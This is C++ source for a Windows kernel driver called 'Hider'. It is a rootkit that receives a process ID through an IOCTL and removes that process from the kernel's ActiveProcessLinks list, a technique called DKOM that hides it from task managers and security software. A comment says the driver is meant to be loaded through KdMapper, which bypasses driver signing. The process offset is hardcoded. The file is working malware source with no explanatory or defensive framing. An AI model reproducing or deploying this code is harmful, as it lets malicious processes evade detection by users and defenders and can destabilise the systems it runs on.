#include <ntifs.h>
#include <ntddk.h>

#define DRIVER_NAME (L"\\Driver\\Hider")
#define DEVICE_NAME (L"\\Device\\Hider")
#define SYMBOLIC_LINK (L"\\DosDevices\\Hider")
#define ACTIVE_PROCESS_LINKS_OFFSET (0x2f0)

#define KernelDebugPrint(text) (KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, (text))))

struct ioctl_hide_request {
	HANDLE process_id;
};


namespace driver {
	namespace ctl {
		ULONG hide_process = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
	}

	NTSTATUS create(PDEVICE_OBJECT device_object, PIRP irp) {
		UNREFERENCED_PARAMETER(device_object);
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return irp->IoStatus.Status;
	}

	NTSTATUS close(PDEVICE_OBJECT device_object, PIRP irp) {
		UNREFERENCED_PARAMETER(device_object);
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return irp->IoStatus.Status;
	}

	NTSTATUS device_control(PDEVICE_OBJECT device_object, PIRP irp) {
		NTSTATUS status = STATUS_UNSUCCESSFUL;
		PIO_STACK_LOCATION stack_irp = nullptr;
		ioctl_hide_request* request = nullptr;
		ULONG ioctl_code = NULL;
		PEPROCESS target_process = nullptr;

		UNREFERENCED_PARAMETER(device_object);
		
		KernelDebugPrint("[+] Ioctl been sent!\n");
		
		// Getting the code of the ioctl that been sent
		stack_irp = IoGetCurrentIrpStackLocation(irp);
		
		request = reinterpret_cast<ioctl_hide_request*>(irp->AssociatedIrp.SystemBuffer);
		if (nullptr == stack_irp || nullptr == request)
		{
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return status;
		}

		KernelDebugPrint("[+] Got request buffer successfully\n");
		ioctl_code = stack_irp->Parameters.DeviceIoControl.IoControlCode;
		if (driver::ctl::hide_process != ioctl_code)
		{
			KernelDebugPrint("[-] Unsupported ioctl\n");
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return status;
		}

		status = PsLookupProcessByProcessId(
			request->process_id, 
			&target_process
		);

		if (STATUS_UNSUCCESSFUL == status)
		{
			KernelDebugPrint("[-] Couldnt find the pid\n");
			IoCompleteRequest(irp, IO_NO_INCREMENT);
			return status;
		}
		
		KernelDebugPrint("[+] Got Eprocess of target process\n");

		// Get the linked list node of the current process in the process list
		PLIST_ENTRY active_process_links = (PLIST_ENTRY)((ULONG_PTR)target_process + ACTIVE_PROCESS_LINKS_OFFSET);
		
		// Unlink the process
		PLIST_ENTRY next = active_process_links->Flink;
		PLIST_ENTRY previous = active_process_links->Blink;
		
		next->Blink = previous;
		previous->Flink = next;
	
		active_process_links->Flink = (PLIST_ENTRY)&active_process_links->Flink;
		active_process_links->Blink = (PLIST_ENTRY)&active_process_links->Flink;
		

		irp->IoStatus.Status = status;
		irp->IoStatus.Information = sizeof(ioctl_hide_request);
		IoCompleteRequest(irp, IO_NO_INCREMENT);

		return status;
	}

}


extern "C" {
	NTKERNELAPI NTSTATUS IoCreateDriver(
		PUNICODE_STRING DriverName,
		PDRIVER_INITIALIZE InitializationFunction
	);
}

NTSTATUS DriverMain(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
{	
	NTSTATUS status = NULL;
	PDEVICE_OBJECT device_object = nullptr;
	UNICODE_STRING device_name = {};
	UNICODE_STRING symbolic_link = {};

	UNREFERENCED_PARAMETER(registry_path);


	RtlInitUnicodeString(&device_name, DEVICE_NAME);

	status = IoCreateDevice(
		driver_object,
		0,
		&device_name,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&device_object
	);

	if (STATUS_SUCCESS != status)
	{
		KernelDebugPrint("[-] Failed to create driver device\n");
		return status;
	}

	KernelDebugPrint("[+] Driver device created successfully\n");

	RtlInitUnicodeString(&symbolic_link, SYMBOLIC_LINK);
	status = IoCreateSymbolicLink(
		&symbolic_link,
		&device_name
	);

	if (STATUS_SUCCESS != status)
	{
		KernelDebugPrint("[-] Failed to createsymbolic link\n");
		return status;
	}

	KernelDebugPrint("[+] Symbolic link created successfully\n");

	// Allow to pass data between kernel space to user space.
	SetFlag(device_object->Flags, DO_BUFFERED_IO);

	// Setup Ioctl functions
	driver_object->MajorFunction[IRP_MJ_CREATE] = driver::create;
	driver_object->MajorFunction[IRP_MJ_CLOSE] = driver::close;
	driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = driver::device_control;

	// We have already initialized our device.
	ClearFlag(device_object->Flags, DO_DEVICE_INITIALIZING);

	KernelDebugPrint("[+] Driver initialized successfully!!\n");

	return STATUS_SUCCESS;
}

// This function will be called by the KdMapper and thats why it does not get any parameters.
NTSTATUS DriverEntry()
{
	UNICODE_STRING driver_name = {};

	KernelDebugPrint("[+] Driver loaded to kernel memory\n");
	
	RtlInitUnicodeString(&driver_name, DRIVER_NAME);
	
	// Initializing the driver properly as it should be on windows.
	return IoCreateDriver(&driver_name, &DriverMain);
}